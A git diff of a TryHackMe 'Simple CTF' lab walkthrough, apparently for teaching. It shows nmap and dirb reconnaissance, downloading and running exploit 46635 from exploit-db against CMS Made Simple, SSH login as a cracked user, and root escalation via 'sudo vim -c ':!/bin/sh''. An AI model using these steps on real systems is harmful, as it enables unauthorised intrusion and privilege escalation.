@@ -10,7 +10,7 @@ This writeup was last updated: 6/28/2023
 > Port Scanning Using Nmap
 1. Started up this room’s machine
 2. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt` to perform a network scan to scan for open ports while utilizing default scripts (-sC) and version detection (-sV) to identify services, as well as their versions, and vulnerabilities on the target system, and then redirect the results into a text file
-3. `cat {FILENAME1}.txt` to output the scan results from the previous command
+3. `cat {FILENAME1}.txt` to output the scan results from the previous command onto our terminal
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ nmap -sC -sV 10.10.70.173 > PortScan.txt
@@ -58,7 +58,7 @@ Nmap done: 1 IP address (1 host up) scanned in 48.29 seconds
 #
 > Scanning for Hiddent Web Directories Using Dirb
 4. `dirb http://{TARGET IP} -r > {FILENAME2}.txt` to non-recursively scan the target URL for directories using Dirb's default wordlist and then redirecting the results into a text file
-5. `cat {FILENAME2}.txt` to output the scan results from the previous command
+5. `cat {FILENAME2}.txt` to output the scan results from the previous command onto our terminal
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ dirb http://10.10.70.173 -r > WebDirectoryScan.txt 
@@ -96,6 +96,7 @@ DOWNLOADED: 4612 - FOUND: 3
 6. `firefox http://{TARGET IP}/simple`
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Simple%20CTF/CMS%20Made%20Simple.png)
+
 7. `searchsploit "CMS made simple 2.2.8" --www`
 ```bash
 ┌──(kali㉿kali)-[~]
@@ -136,6 +137,7 @@ SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
 ```
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Simple%20CTF/Editing%2046635.py.png)
+
 12. `python 46635`
 ```bash
 ┌──(kali㉿kali)-[~/Downloads]
@@ -202,6 +204,7 @@ $
 17. `whoami`
 18. `pwd`
 19. `ls`
+20. `cat {USER TEXT FILE}`
 ```bash
 $ whoami
 mitch
@@ -214,7 +217,6 @@ $ pwd
 $ ls
 user.txt
 ```
-20. `cat {FILE1}.txt`
 ```bash
 $ cat user.txt
 G00d j0b, keep up!
@@ -238,22 +240,18 @@ $ sudo vim -c ':!/bin/sh'
 #
 ```
 24. `whoami`
-25. `cd /root`
-26. `ls`
+25. `ls /root`
+26. `cat {ROOT TEXT FILE}`
 ```bash
 # whoami
 root
 ```
 ```bash
-# cd /root
-```
-```bash
-# ls
+# ls /root
 root.txt
 ```
-27. `cat root.txt`
 ```bash
-# cat root.txt  
+# cat /root/root.txt  
 W3ll d0n3. You made it!
 ```
 
@@ -262,7 +260,31 @@ W3ll d0n3. You made it!
 ![]()
 
 # Command History
-> Step
+1. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
+2. `cat {FILENAME1}.txt`
+3. `dirb http://{TARGET IP} -r > {FILENAME2}.txt`
+4. `cat {FILENAME2}.txt`
+5. `firefox http://{TARGET IP}/simple`
+6. `searchsploit "CMS made simple 2.2.8" --www`
+7. `wget https://www.exploit-db.com/raw/46635`
+8. `ls`
+9. `python 46635`
+10. `gedit python 46635`
+11. `python 46635`
+12. `python 46635 -u http://{TARGET IP}/simple --crack -w {WORDLIST PATH}`
+13. `gedit 46635`
+14. `python3 46635 -u http://{TARGET IP}/simple --crack -u {WORDLIST PATH}`
+15. `ssh {USERNAME}@{TARGET IP} -p 2222`
+16. `whoami`
+17. `pwd`
+18. `ls`
+19. `cat {FILE1}.txt`
+20. `sudo -l`
+21. `firefox "https://gtfobins.github.io/"`
+22. `sudo vim -c ':!/bin/sh'`
+23. `whoami`
+24. `ls /root`
+25. `cat {ROOT TEXT FILE}`
 
 # Dissecting Some Commands
 > Step
